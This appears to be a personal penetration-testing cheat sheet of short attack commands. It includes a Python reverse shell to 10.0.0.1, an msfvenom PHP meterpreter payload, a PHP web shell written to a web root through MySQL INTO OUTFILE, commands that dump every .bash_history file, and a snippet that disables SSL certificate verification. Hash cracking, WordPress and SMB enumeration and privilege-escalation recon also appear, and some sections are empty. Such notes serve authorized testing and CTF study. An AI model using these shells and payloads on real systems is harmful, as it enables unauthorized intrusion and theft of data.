# Offensive Bash Scripts
	1. Searching and catting  .bash_history files for any commands
		find -name ".bash_history" -exec cat {} \;
		find /home -name ".bash_history" -exec cat {} \;
		
			> Everything between the -exec and trailing \; is the command to run
			> {} will catch the contents from find command
			
	2. Searching and Catting  .bash_history file contents
		cat $(find /home -name ".bash_history")
		
# Hash Cracking 

	1. hash-identifier  
		helps to check the type of hash; MD5, MD2
	2. findmyhash MD5 -h b78aae356709f8c31118ea613980954b

# Privilege Escalation
	1. uname -a
	2. cat /etc/*release*
	3. cat /etc/lsb-release
	4. http://www.securitysift.com/download/linuxprivchecker.py 

# Bash shells
	1. /usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
	2. sudo -i 
		Lets the user to run the shell as root privs. Also acquires the root user's environment.
	
	
# Bind Shells



# Reverse Shells
	1. Python shell
		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Reverse Shells using metasploit

  	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
     		 
		 append <?php ?> in the shell.php file

# Wordpress Scanning
	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
	2. wpscan --url https://10.0.2.9:12038/blogblog --enumerate ap
	
    		u : enumerate usernames 
    		vp : vulnerable plugins
		p : plugins
		ap : all plugins
    
# Changing a python urllib2.urlopen method to work with ssl

	1. 
		import ssl 
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE

		urllib2.urlopen(----- , context = ctx)

# After getting access to mysql command line remotely

	1. Creating a file onto the remote server
		mysql> select "baba" into outfile "/var/www/html/somepath/wp-content/uploads/test.txt";
		mysql> select "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/somepath/shell.php"
    
# smb scan
	1. smbclient -L 192.168.1.1
	2. 
